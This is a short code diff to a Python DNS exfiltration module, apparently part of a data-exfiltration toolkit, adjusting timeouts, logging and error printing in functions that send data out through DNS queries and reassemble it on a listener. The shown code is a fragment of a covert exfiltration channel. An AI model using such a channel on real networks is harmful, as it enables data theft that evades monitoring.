@@ -29,7 +29,7 @@ def handle_dns_query(qname):
                 app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
                 buf[jobid] = []
     except Exception as e:
-        # print(e)
+        print(e)
         pass
 
 def relay_dns_query(domain):
@@ -39,7 +39,7 @@ def relay_dns_query(domain):
             'info', "[proxy] [dns] Relaying dns query to {0}".format(target))
     q = DNSRecord.question(domain)
     try:
-        q.send(target, port, timeout=0.01)
+        q.send(target, port, timeout=0.001)
     except:
         pass
 
@@ -103,14 +103,15 @@ def send(data):
         #domain = ""
         target = choice(targets)
         try:
-            app_exfiltrate.log_message(
-                'info', "[DNS] Sending {0} bytes with DNS packet to {1}. PacketIndex = {2} FragementIndex = {3} ".format(len(domain), target, packet_index, fragment_index))
+            #app_exfiltrate.log_message(
+            #    'info', "[DNS] Sending {0} bytes with DNS packet to {1}. PacketIndex = {2} FragementIndex = {3} ".format(len(domain), target, packet_index, fragment_index))
+            app_exfiltrate.log_message('info', "[DNS] packet send. PacketIndex = {0}".format(packet_index))
             #app_exfiltrate.log_message('info', domain)
             q.send(target, port, timeout=0.01)
 
         except Exception as e:
-            print(e)
-            # app_exfiltrate.log_message('warning', "[dns] Failed to send DNS request")
+            #print(e)
+            #app_exfiltrate.log_message('warning', "[dns] Failed to send DNS request")
             pass
 
 def listen():
